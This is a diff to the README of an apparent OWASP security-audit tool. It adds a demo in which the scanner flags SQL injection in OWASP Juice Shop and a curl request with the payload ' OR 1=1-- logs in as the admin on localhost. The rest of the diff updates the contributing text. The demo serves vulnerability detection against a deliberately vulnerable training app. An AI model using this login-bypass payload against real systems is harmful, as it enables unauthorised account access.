@@ -10,8 +10,31 @@
 ---
 [![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/engrshoaibh/owasp-security-audit-skill/badge)](https://scorecard.dev/viewer/?uri=github.com/engrshoaibh/owasp-security-audit-skill)
 
+## 🎬 See it in 60 seconds
+
+<!-- DEMO-VIDEO: replace this comment with the uploaded video link (see examples/demo/README.md) -->
+
+Pointed at [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) `v20.4.0`, a quick check flags the login
+query, and a local request proves it:
+
+```text
+$ loophole_scanner.py --target juice-shop --paths routes lib server.ts --quick
+| INJ-01 | High | CWE-89 | A05:2025 | routes/login.ts:34  | SQL built with string interpolation / raw unsafe query |
+| INJ-01 | High | CWE-89 | A05:2025 | routes/search.ts:23 | SQL built with string interpolation / raw unsafe query |
+
+$ cat payload.json
+{"email": "' OR 1=1--", "password": "anything"}
+$ curl -s localhost:3000/rest/user/login -H 'Content-Type: application/json' -d @payload.json
+{"authentication":{"token":"eyJ0eXAi...","bid":1,"umail":"admin@juice-sh.op"}}
+```
+
+Reproduce it with [`examples/demo/juice-shop-demo.sh`](examples/demo/).
+
+---
+
 ## 📌 Table of Contents
 
+- [See it in 60 seconds](#-see-it-in-60-seconds)
 - [Overview](#-overview)
 - [Key Features](#-key-features)
 - [Install (one command per agent)](#-install-one-command-per-agent)
@@ -388,7 +411,8 @@ Specific resource loop hazards checked:
 
 ## 🤝 Contributing & License
 
-Contributions, new framework checklists, and rule additions are welcome! Please submit an issue or pull request.
+Contributions, new framework checklists, and rule additions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md)
+and pick a [`good first issue`](https://github.com/engrshoaibh/owasp-security-audit-skill/labels/good%20first%20issue).
 Every new scanner rule needs a positive and a negative case in `tests/test_loophole_scanner.py`
 (run `python -m unittest discover -s tests -v`).
 
